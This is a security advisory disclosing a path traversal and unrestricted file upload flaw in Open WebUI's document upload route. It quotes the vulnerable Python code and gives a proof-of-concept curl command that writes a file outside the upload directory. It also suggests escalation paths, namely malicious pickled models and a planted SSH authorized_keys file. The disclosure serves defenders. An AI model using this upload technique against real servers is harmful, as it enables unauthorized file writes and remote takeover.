# [H] Open WebUI Vulnerable to Arbitrary File Upload and Path Traversal

## Summary
Severity: High
Advisory: GHSA-9pgh-j74g-qj6m
CVE: CVE-2026-44566
CWE: CWE-22, CWE-434
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-9pgh-j74g-qj6m
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.1.124

## Details
# **CONFIDENTIAL**

# KL-CAN-2024-002

## Vulnerability Details

| # | Field | Value |
|---|-------|-------|
| 1 | **Discoverer** | Jaggar Henry & Sean Segreti of KoreLogic, Inc. |
| 2 | **Date Submitted** | 2024.03.12 |
| 3 | **Title** | Open WebUI Arbitrary File Upload + Path Traversal |
| 5 | **Affected Vendor** | Open WebUI |
| 6 | **Affected Product(s)** | Open WebUI (Formerly Ollama WebUI) |
| 7 | **Affected Version(s)** | 0.1.105 |
| 8 | **Platform/OS** | Debian GNU/Linux 12 (bookworm) |
| 9 | **Vector** | HTTP web interface |
| 10 | **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'), CWE-434: Unrestricted Upload of File with Dangerous Type |

---

## 4. High-level Summary

Attacker controlled files can be uploaded to arbitrary locations on the web server's filesystem by abusing a path traversal vulnerability.

---

## 11. Technical Analysis

When attaching files to a prompt by clicking the plus sign (+) on the left of the message input box when using the Open WebUI HTTP interface, the file is uploaded to a static upload directory.

The name of the file is derived from the original HTTP upload request and is not validated or sanitized. This allows for users to upload files with names containing dot-segments in the file path and traverse out of the intended uploads directory. Effectively, users can upload files anywhere on the filesystem the user running the web server has permission.

This can be visualized by examining the python code for the `/rag/api/v1/doc` API route:

```python
@app.post("/doc")
def store_doc(
    collection_name: Optional[str] = Form(None),
    file: UploadFile = File(...),
    user=Depends(get_current_user),
):
    # "https://www.gutenberg.org/files/1727/1727-h/1727-h.htm"

    print(file.content_type)
    try:
        filename = file.filename
        file_path = f"{UPLOAD_DIR}/{filename}"
        contents = file.file.read()
        with open(file_path, "wb") as f:
            f.write(contents)
            f.close()
```

The `file` variable is a representation of the multipart form data contained within the HTTP POST request. The `filename` variable is derived from the uploaded file name and is not validated before writing the file contents to disk.

This can be used to upload malicious models. These models are often distributed as pickled python objects and can be leveraged to execute arbitrary python bytecode once deserialized. Alternatively, an attacker can leverage existing services, such as SSH, to upload an attacker controlled `authorized_keys` file to remotely connect to the machine.

---

## 12. Proof-of-Concept

Execute the following cURL command:

```bash
TARGET_URI='https://redacted.com'; JWT='redacted'; LOCAL_FILE='/tmp/file_to_upload.txt'\
curl -H "Authorization: Bearer $JWT" -F "file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt" "$TARGET_URI/rag/api/v1/doc"
```

Verify the file `pwned.txt` exists in the `/tmp/` directory on the machine hosting the web server:

```console
ollama@webserver:~$ cat /tmp/pwned.txt 
korelogic
ollama@webserver:~$
```

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-9pgh-j74g-qj6m
- https://nvd.nist.gov/vuln/detail/CVE-2026-44566
- https://github.com/open-webui/open-webui
